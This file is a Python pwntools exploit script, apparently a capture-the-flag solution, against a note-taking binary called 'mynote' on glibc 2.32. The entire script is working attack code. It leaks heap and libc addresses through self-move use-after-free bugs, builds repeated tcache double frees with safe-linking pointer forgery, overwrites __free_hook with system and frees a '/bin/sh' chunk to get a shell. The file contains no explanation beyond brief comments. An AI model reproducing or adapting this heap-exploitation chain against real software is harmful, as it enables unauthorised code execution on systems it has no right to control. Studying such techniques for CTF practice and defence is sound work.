#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *
from LibcSearcher import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.32/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./mynote')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
p = process('./mynote')
debug()

def menu(choice):
    sla('> ',str(choice))

def add(id,size,data):
    menu(1)
    sla('Index: ',str(id))
    sla('Size: ',str(size))
    sla('Content: ',str(data))

def show(id):
    menu(2)
    sla('Index: ',str(id))

def move(fr,to):
    menu(3)
    sla('Index (src): ',str(fr))
    sla('Index (dest): ',str(to))

def copy(fr,to):
    menu(4)
    sla('Index (src): ',str(fr))
    sla('Index (dest): ',str(to))

# Leak Heap
add(0,0x70,'0'*0x65)
add(1,0x70,'1'*0x65)   
add(2,0x70,'a')     # Smallbin 1
move(0,0)
move(1,1)
show(0)
next_leak = uu64(rc(5))
info_addr('next_leak',next_leak)
heap_addr = (next_leak<<12) + 0x10
info_addr('heap_addr',heap_addr)

# Prepare for 2 chunks
for i in range(0x10):
    add(3,0x70,'a')
add(4,0x70,'uuu')     # Smallbin 2
for i in range(0x10):
    add(3,0x70,'a')

# Double Free 1 --> Enable Smallbin while Corrupting necessary counts
# If u dont't know how to corrupt, go on and look back later
move(0,0)
move(1,1)
add(3,0x68,p64(((heap_addr+0x310)>>12)^(heap_addr))+p64(0))
copy(3,1)
add(3,0x70,'u'*0x10)
add(3,0x70,p16(1)*1+p16(0)*7+p16(255)*0x20)
# Clean the Tcache Key
add(3,0x68,p64(0)+p64(0))
copy(3,0)
copy(3,1)

# Double Free 2 --> Unsortedbin 1
move(0,0)
move(1,1)
add(3,0x68,p64(((heap_addr+0x310)>>12)^(heap_addr+0x380))+p64(0))
copy(3,1)
add(3,0x70,'u'*0x10)
add(3,0x70,p64(0)+p64(0x101))
# Clean the Tcache Key
add(3,0x68,p64(0)+p64(0))
copy(3,0)
copy(3,1)
# move(2,2) [!] DONT FREE CHUNK2 NOW [!]

# Double Free 3 --> Unsortedbin 2
move(0,0)
move(1,1)
add(3,0x68,p64(((heap_addr+0x310)>>12)^(heap_addr+0xb00))+p64(0))
copy(3,1)
add(3,0x70,'u'*0x10)
add(3,0x70,p64(0)+p64(0x101))
# Clean the Tcache Key
add(3,0x68,p64(0)+p64(0))
copy(3,0)
copy(3,1)
move(2,2)
move(4,4)

# Alloc a chunk,turn Unsortedbin --> Smallbin
add(5,0x40,'')
# Leak libc
show(4)
libc_leak = uu64(rc(6))
libc_base = libc_leak - 0x1e3cf0
libc = ELF('./libc.so.6')
__free_hook = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
info_addr('libc_leak',libc_leak)
info_addr('libc_base',libc_base)
info_addr('__free_hook',__free_hook)
info_addr('system_addr',system_addr)

# Double Free 4 --> Hijack the __free_hook
move(0,0)
move(1,1)
add(3,0x68,p64(((heap_addr+0x310)>>12)^(heap_addr+0x80))+p64(0))
copy(3,1)
add(3,0x70,'u'*0x10)
# Yeah,Chunk 3 is MVP
add(3,0x70,p64(__free_hook))
add(3,0x18,p64(system_addr))
add(3,0x70,'/bin/sh\0')
move(3,3)

p.interactive()